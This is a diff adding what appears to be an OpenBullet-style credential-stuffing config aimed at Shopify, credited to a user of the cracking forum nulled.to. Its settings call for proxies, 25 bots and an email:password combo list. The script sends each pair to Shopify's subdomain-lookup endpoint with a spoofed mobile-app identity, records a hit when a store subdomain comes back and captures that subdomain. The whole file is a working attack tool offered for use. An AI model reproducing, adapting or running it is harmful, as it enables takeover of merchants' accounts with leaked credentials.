@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Shopify",
+  "SuggestedBots": 25,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-01T12:21:10.236961+02:00",
+  "AdditionalInfo": "",
+  "Author": "Bogdan",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://app.shopify.com/services/find_subdomain.json" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Shopify Mobile/Android/8.14.0 (Build 32495 with API 22 on Samsung SM-A530F)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "X-DeviceID: dad9cc31-e768-4880-884e-faddc426c93d" 
+  HEADER "X-Shopify-Override-User-Locale: en-US" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "subdomain" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" EqualTo "{}" 
+
+PARSE "<SOURCE>" JSON "subdomain" -> CAP "Subdomain" "" " | Bogdan/nulled.to" 
+
